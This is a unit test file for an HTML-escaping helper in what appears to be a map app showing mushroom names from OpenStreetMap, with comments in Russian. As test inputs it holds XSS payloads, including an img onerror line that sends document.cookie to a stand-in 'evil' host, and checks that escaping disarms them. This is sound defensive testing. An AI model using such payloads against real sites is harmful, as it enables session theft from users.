import { describe, it, expect } from "vitest";
import { escapeHtml } from "./escapeHtml";

describe("escapeHtml", () => {
  it("escapes <, >, & in canonical order (& first to avoid double-escape)", () => {
    expect(escapeHtml("a & b < c > d")).toBe("a &amp; b &lt; c &gt; d");
  });

  it("escapes quote characters used in attributes", () => {
    expect(escapeHtml(`O'Neil "the boletus"`)).toBe(
      "O&#39;Neil &quot;the boletus&quot;",
    );
  });

  it("neutralizes <script> XSS payload", () => {
    const malicious = `<script>alert('xss')</script>`;
    const escaped = escapeHtml(malicious);
    expect(escaped).not.toContain("<script>");
    expect(escaped).toContain("&lt;script&gt;");
  });

  it("neutralizes <img onerror> XSS payload (the popup attack vector)", () => {
    // Реалистичный сценарий: OSM-имя `<img src=x onerror=fetch('//evil/'+document.cookie)>`,
    // подставляемое через popup.setHTML без эскейпа, выполнило бы fetch.
    // Главная защита — экранирование `<` и `>`, после чего строка перестаёт
    // быть HTML-тегом. Атрибут `onerror=` остаётся в виде литерального
    // текста, но без `<img>` он безвреден.
    const malicious = `<img src=x onerror=fetch('//evil/'+document.cookie)>`;
    const escaped = escapeHtml(malicious);
    expect(escaped).not.toMatch(/<img/);
    expect(escaped).not.toMatch(/<\/?\w+/); // никаких распознаваемых тегов
    expect(escaped).toContain("&lt;img");
    expect(escaped).toContain("&#39;");
  });

  it("does not double-escape entity-like substrings", () => {
    // & должен превратиться в &amp; ровно один раз; «&amp;» — это исходные
    // 5 символов пользовательского ввода, не уже-эскейпленный амперсанд.
    expect(escapeHtml("&amp;")).toBe("&amp;amp;");
  });

  it("is a no-op on safe ASCII", () => {
    expect(escapeHtml("Boletus edulis 2026")).toBe("Boletus edulis 2026");
  });

  it("preserves Unicode (Cyrillic, emoji)", () => {
    expect(escapeHtml("Боровик 🍄")).toBe("Боровик 🍄");
  });

  it("handles empty string", () => {
    expect(escapeHtml("")).toBe("");
  });
});
